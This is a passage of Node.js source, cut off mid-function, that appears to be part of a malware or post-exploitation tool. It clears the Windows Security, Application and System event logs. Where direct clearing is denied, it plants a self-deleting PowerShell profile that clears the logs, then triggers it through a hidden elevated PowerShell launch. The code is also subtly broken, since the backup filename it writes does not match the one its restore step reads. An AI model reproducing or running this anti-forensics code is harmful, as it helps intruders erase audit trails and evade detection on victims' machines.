```javascript
const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

function getOutput(command) {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout, stderr) => {
            if (error) {
                reject(stderr);
            } else {
                resolve(stdout.trim());
            }
        });
    });
}

async function clearEv() {
    try {
        const tryy = await getOutput('powershell -c "Clear-EventLog \\"Security\\""');
        if (!tryy.includes("not allowed.")) {
            exec('powershell -c "Clear-EventLog \\"Application\\""', { shell: true });
            exec('powershell -c "Clear-EventLog \\"System\\""', { shell: true });
        } else {
            // The second way :D
            let code = 'Clear-EventLog "Security"\n';
            code += 'Clear-EventLog "Application"\n';
            code += 'Clear-EventLog "System"\n';
            code += "\nfunction SelfDestruct() {\n";
            code += "$path = (Get-Variable MyInvocation -Scope 1).Value.MyCommand.Path\n";
            code += "Clear-Content $path\n";
            code += "Remove-Item $path}\n";
            code += "SelfDestruct\n";
            code += '\nif( (Test-Path "Profile-Backup.ps1") ){';
            code += "\n$content=Get-Content \"Profile-Backup.ps1\"";
            code += "\nSet-Content -Path \"profile.ps1\" -Value $content ";
            code += "\nRemove-Item \"Profile-Backup.ps1\"}";

            const pth = await getOutput('powershell -c "echo $PsHome"');
            const chpro = await getOutput(`IF EXIST ${path.join(pth, "profile.ps1")} (echo true)`);

            if (chpro !== "true") {
                try {
                    fs.writeFileSync(path.join(pth, "profile.ps1"), code);
                } catch (err) {
                    // not enough permissions to create!
                } finally {
                    exec('powershell -c "Start-Process powershell -Verb runAs -WindowStyle Hidden" >> NUL', { shell: true });
                }
            } else {
                try {
                    const backup = fs.readFileSync(path.join(pth, "profile.ps1"), 'utf8');
                    fs.writeFileSync(path.join(pth, "Profile-Backup"), backup);
                    fs.writeFileSync(path.join(pth, "profile.ps1"), code);
                } catch (err) {
                    // not enough permissions to edit!
                } finally {
                    exec('powershell -c "Start-Process powershell -Verb runAs -WindowStyle Hidden" >> NUL', { shell: true });
